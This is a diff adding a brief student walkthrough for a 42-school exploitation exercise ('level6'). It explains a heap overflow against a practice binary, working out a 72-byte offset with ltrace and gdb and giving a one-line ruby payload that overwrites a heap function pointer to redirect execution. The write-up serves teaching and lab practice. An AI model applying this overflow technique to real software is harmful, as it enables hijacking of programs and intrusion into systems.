@@ -1,0 +1,24 @@
+# **************************************************************************** #
+#                                                                              #
+#                                                         :::      ::::::::    #
+#    walkthrough                                        :+:      :+:    :+:    #
+#                                                     +:+ +:+         +:+      #
+#    By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+         #
+#                                                 +#+#+#+#+#+   +#+            #
+#    Created: 2021/04/24 17:13:08 by fcadet            #+#    #+#              #
+#    Updated: 2021/04/24 17:48:23 by fcadet           ###   ########.fr        #
+#                                                                              #
+# **************************************************************************** #
+
+- here we want to call n instead of m
+- we can override heap allocated function pointer fn value by overflowing heap
+allocated str (heap grows from low address to high address and fn is allocated
+after str so it has an higher address)
+
+- using ltrace we can see malloc result
+- str @ 0x0804a008 and fn @ 0x0804a050
+- 0x0804a050 - 0x0804a008 = 0x48, we need to write 72 bytes in str before reaching fn
+- using gdb we find n @ 0x08048454
+
+- we can write our exploit command
+	- ./level6 $(ruby -e 'print "x" * 72 + "\x54\x84\x04\x08"')
